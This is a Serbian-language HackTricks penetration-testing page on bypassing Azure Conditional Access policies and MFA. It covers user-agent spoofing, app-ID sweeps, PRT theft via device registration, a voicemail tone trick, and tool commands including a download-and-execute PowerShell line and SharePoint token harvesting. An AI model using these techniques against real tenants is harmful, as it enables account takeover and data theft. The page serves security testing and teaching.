# Az - Politike uslovnog pristupa i zaobilaÅ¾enje MFA

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne informacije

Azure politike uslovnog pristupa su pravila postavljena u Microsoft Azure-u za sprovoÄ‘enje kontrola pristupa do Azure usluga i aplikacija na osnovu odreÄ‘enih **uslova**. Ove politike pomaÅ¾u organizacijama da osiguraju svoje resurse primenom pravih kontrola pristupa pod pravim okolnostima.\
Politike uslovnog pristupa u osnovi **definiÅ¡u** **Ko** moÅ¾e pristupiti **ÄŒemu** iz **Gde** i **Kako**.

Evo nekoliko primera:

1. **Politika rizika prijavljivanja**: Ova politika moÅ¾e biti postavljena da zahteva viÅ¡efaktorsku autentifikaciju (MFA) kada se otkrije rizik prijavljivanja. Na primer, ako je ponaÅ¡anje korisnika prilikom prijavljivanja neobiÄno u poreÄ‘enju sa njihovim redovnim obrascem, kao Å¡to je prijavljivanje iz druge zemlje, sistem moÅ¾e zatraÅ¾iti dodatnu autentifikaciju.
2. **Politika usklaÄ‘enosti ureÄ‘aja**: Ova politika moÅ¾e ograniÄiti pristup Azure uslugama samo na ureÄ‘aje koji su usklaÄ‘eni sa bezbednosnim standardima organizacije. Na primer, pristup moÅ¾e biti dozvoljen samo sa ureÄ‘aja koji imaju aÅ¾uriran antivirusni softver ili koji koriste odreÄ‘enu verziju operativnog sistema.

## ZaobilaÅ¾enje politika uslovnog pristupa

MoguÄ‡e je da politika uslovnog pristupa **proverava neke informacije koje se lako mogu izmeniti, Å¡to omoguÄ‡ava zaobilaÅ¾enje politike**. I ako je, na primer, politika konfigurisala MFA, napadaÄ Ä‡e moÄ‡i da je zaobiÄ‘e.

Prilikom konfiguracije politike uslovnog pristupa potrebno je naznaÄiti **korisnike** koji su pogoÄ‘eni i **ciljane resurse** (kao Å¡to su sve cloud aplikacije).

TakoÄ‘e je potrebno konfigurisati **uslove** koji Ä‡e **pokrenuti** politiku:

* **MreÅ¾a**: IP, IP opsezi i geografske lokacije
* MoÅ¾e se zaobiÄ‡i koriÅ¡Ä‡enjem VPN-a ili Proxy-a za povezivanje sa zemljom ili uspevajuÄ‡i da se prijavi sa dozvoljene IP adrese
* **Microsoft rizici**: Rizik korisnika, Rizik prijavljivanja, Rizik unutraÅ¡njeg korisnika
* **Platforme ureÄ‘aja**: Bilo koji ureÄ‘aj ili odabrati Android, iOS, Windows telefon, Windows, macOS, Linux
* Ako â€œBilo koji ureÄ‘ajâ€ nije odabran, ali su sve druge opcije odabrane, moguÄ‡e je zaobiÄ‡i to koristeÄ‡i nasumiÄni user-agent koji nije povezan sa tim platformama
* **Klijentske aplikacije**: Opcije su â€œPregledaÄâ€, â€œMobilne aplikacije i desktop klijentiâ€, â€œExchange ActiveSync klijentiâ€ i â€œOstali klijentiâ€
* Da bi se zaobiÅ¡ao prijavljivanje sa neodabranom opcijom
* **Filter za ureÄ‘aje**: MoguÄ‡e je generisati pravilo vezano za koriÅ¡Ä‡eni ureÄ‘aj
* **Tokovi autentifikacije**: Opcije su â€œTok kod ureÄ‘ajaâ€ i â€œPrenos autentifikacijeâ€
* Ovo neÄ‡e uticati na napadaÄa osim ako ne pokuÅ¡ava da zloupotrebi neki od tih protokola u pokuÅ¡aju phishing-a da pristupi nalogu Å¾rtve

MoguÄ‡i **rezultati** su: Blokirati ili Dodeliti pristup uz potencijalne uslove kao Å¡to su zahtevati MFA, ureÄ‘aj da bude usklaÄ‘en...

### Platforme ureÄ‘aja - Uslov ureÄ‘aja

MoguÄ‡e je postaviti uslov zasnovan na **platformi ureÄ‘aja** (Android, iOS, Windows, macOS...), meÄ‘utim, ovo se zasniva na **user-agent-u** tako da je lako zaobiÄ‡i. ÄŒak i **postavljanjem svih opcija da primenjuju MFA**, ako koristite **user-agent koji nije prepoznat**, moÄ‡i Ä‡ete da zaobiÄ‘ete MFA ili blokadu:

<figure><img src="../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

Samo slanjem pregledaÄa **nepoznatog user-agent-a** (kao Å¡to je `Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920) UCBrowser/10.1.0.563 Mobile`) dovoljno je da ne pokrene ovaj uslov.\
MoÅ¾ete promeniti user agent **ruÄno** u alatima za razvoj:

<figure><img src="../../../.gitbook/assets/image (351).png" alt="" width="375"><figcaption></figcaption></figure>

&#x20;Ili koristiti [ekstenziju za pregledaÄ poput ove](https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg?hl=en).

### Lokacije: Zemlje, IP opsezi - Uslov ureÄ‘aja

Ako je ovo postavljeno u uslovnoj politici, napadaÄ bi mogao samo da koristi **VPN** u **dozvoljenoj zemlji** ili pokuÅ¡ati da pronaÄ‘e naÄin da pristupi sa **dozvoljene IP adrese** da bi zaobiÅ¡ao ove uslove.

### Cloud aplikacije

MoguÄ‡e je konfigurisati **politike uslovnog pristupa da blokiraju ili primoraju** na primer MFA kada korisnik pokuÅ¡a da pristupi **odreÄ‘enoj aplikaciji**:

<figure><img src="../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

Da biste pokuÅ¡ali da zaobiÄ‘ete ovu zaÅ¡titu, trebali biste videti da li moÅ¾ete **prijaviti se u bilo koju aplikaciju**.\
Alat [**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep) ima **desetine ID-eva aplikacija hardkodiranih** i pokuÅ¡aÄ‡e da se prijavi u njih i obavestiÄ‡e vas i Äak dati token ako bude uspeÅ¡an.

Da biste **testirali specifiÄne ID-eve aplikacija u specifiÄnim resursima**, takoÄ‘e moÅ¾ete koristiti alat kao Å¡to je:

{% code overflow="wrap" %}
```bash
roadrecon auth -u user@email.com -r https://outlook.office.com/ -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --tokens-stdout

<token>
```
{% endcode %}

Pored toga, moguÄ‡e je zaÅ¡tititi i metodu prijavljivanja (npr. ako pokuÅ¡avate da se prijavite iz pregledaÄa ili iz desktop aplikacije). Alat [**Invoke-MFASweep**](az-conditional-access-policies-mfa-bypass.md#invoke-mfasweep) vrÅ¡i neke provere kako bi pokuÅ¡ao da zaobiÄ‘e ove zaÅ¡tite.

Alat [**donkeytoken**](az-conditional-access-policies-mfa-bypass.md#donkeytoken) takoÄ‘e moÅ¾e biti koriÅ¡Ä‡en u sliÄne svrhe, iako izgleda da nije odrÅ¾avan.

Alat [**ROPCI**](https://github.com/wunderwuzzi23/ropci) takoÄ‘e moÅ¾e biti koriÅ¡Ä‡en za testiranje ovih zaÅ¡tita i proveru da li je moguÄ‡e zaobiÄ‡i MFA ili blokade, ali ovaj alat radi iz **whitebox** perspektive. Prvo morate preuzeti listu aplikacija koje su dozvoljene u tenant-u, a zatim Ä‡e pokuÅ¡ati da se prijavi u njih.

## Ostali Az MFA zaobilaÅ¾enja

### Ton zvona

Jedna Azure MFA opcija je da **primite poziv na konfigurisanom broju telefona** gde Ä‡e biti zatraÅ¾eno od korisnika da **poÅ¡alje znak `#`**.

{% hint style="danger" %}
PoÅ¡to su znakovi samo **tonovi**, napadaÄ bi mogao da **kompromituje** **poruku govora** na broju telefona, da konfiguriÅ¡e kao poruku **ton `#`** i zatim, kada se zahteva MFA, da osigura da je **telefon Å¾rtve zauzet** (pozivajuÄ‡i ga) tako da se Azure poziv preusmeri na govornu poÅ¡tu.
{% endhint %}

### UsklaÄ‘eni ureÄ‘aji

Politike Äesto zahtevaju usklaÄ‘eni ureÄ‘aj ili MFA, tako da bi **napadaÄ mogao da registruje usklaÄ‘eni ureÄ‘aj**, dobije **PRT** token i **na ovaj naÄin zaobiÄ‘e MFA**.

PoÄnite tako Å¡to Ä‡ete registrovati **usklaÄ‘eni ureÄ‘aj u Intune**, zatim **dobijte PRT** sa:
```powershell
$prtKeys = Get-AADIntuneUserPRTKeys - PfxFileName .\<uuid>.pfx -Credentials $credentials

$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GertNonce

Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

<token returned>
```
PronaÄ‘ite viÅ¡e informacija o ovoj vrsti napada na sledeÄ‡oj stranici:

{% content-ref url="../az-lateral-movement-cloud-on-prem/pass-the-prt.md" %}
[pass-the-prt.md](../az-lateral-movement-cloud-on-prem/pass-the-prt.md)
{% endcontent-ref %}

## Alati

### [**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep)

Ovaj skript uzima neke korisniÄke akreditive i proverava da li moÅ¾e da se prijavi u neke aplikacije.

Ovo je korisno da se vidi da li **niste obavezni za MFA da se prijavite u neke aplikacije** koje kasnije moÅ¾ete zloupotrebiti da **poveÄ‡ate privilegije**.

### [roadrecon](https://github.com/dirkjanm/ROADtools)

Dobijte sve politike
```bash
roadrecon plugin policies
```
### [Invoke-MFASweep](https://github.com/dafthack/MFASweep)

MFASweep je PowerShell skripta koja pokuÅ¡ava da **prijavi na razne Microsoft usluge koristeÄ‡i dati skup akreditiva i pokuÅ¡aÄ‡e da identifikuje da li je MFA omoguÄ‡ena**. U zavisnosti od toga kako su konfigurisana pravila uslovnog pristupa i druge postavke viÅ¡efaktorske autentifikacije, neki protokoli mogu ostati sa jednim faktorom. TakoÄ‘e ima dodatnu proveru za ADFS konfiguracije i moÅ¾e pokuÅ¡ati da se prijavi na on-prem ADFS server ako je otkriven.
```bash
Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1").Content
Invoke-MFASweep -Username <username> -Password <pass>
```
### [ROPCI](https://github.com/wunderwuzzi23/ropci)

Ovaj alat je pomogao u identifikaciji zaobilaÅ¾enja MFA i zatim u zloupotrebi API-ja u viÅ¡e produkcionih AAD tenanata, gde su AAD korisnici verovali da imaju primenjen MFA, ali je ROPC zasnovana autentifikacija uspela.

{% hint style="success" %}
Morate imati dozvole da biste prikazali sve aplikacije kako biste mogli da generiÅ¡ete listu aplikacija za brute-force.
{% endhint %}
```bash
./ropci configure
./ropci apps list --all --format json -o apps.json
./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' > apps.csv
./ropci auth bulk -i apps.csv -o results.json
```
### [donkeytoken](https://github.com/silverhack/donkeytoken)

Donkey token je skup funkcija koje imaju za cilj da pomognu bezbednosnim konsultantima koji treba da validiraju politike uslovnog pristupa, testove za Microsoft portale sa 2FA, itd.

<pre class="language-powershell"><code class="lang-powershell"><strong>git clone https://github.com/silverhack/donkeytoken.git
</strong><strong>Import-Module '.\donkeytoken' -Force
</strong></code></pre>

**Testirajte svaki portal** da li je moguÄ‡e **prijaviti se bez MFA**:
```powershell
$username = "conditional-access-app-user@azure.training.hacktricks.xyz"
$password = ConvertTo-SecureString "Poehurgi78633" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
Invoke-MFATest -credential $cred -Verbose -Debug -InformationAction Continue
```
Zato Å¡to **Azure** **portal** **nije ograniÄen**, moguÄ‡e je **prikupiti token sa krajnje taÄke portala za pristup bilo kojoj usluzi koja je otkrivena** prethodnom izvrÅ¡avanjem. U ovom sluÄaju, Sharepoint je identifikovan, i traÅ¾i se token za pristup:

{% code overflow="wrap" %}
```powershell
$token = Get-DelegationTokenFromAzurePortal -credential $cred -token_type microsoft.graph -extension_type Microsoft_Intune
Read-JWTtoken -token $token.access_token
```
{% endcode %}

PretpostavljajuÄ‡i da token ima dozvolu Sites.Read.All (iz Sharepoint-a), Äak i ako ne moÅ¾ete da pristupite Sharepoint-u putem veba zbog MFA, moguÄ‡e je koristiti token za pristup datotekama sa generisanim tokenom:
```powershell
$data = Get-SharePointFilesFromGraph -authentication $token $data[0].downloadUrl
```
## References

* [https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s](https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
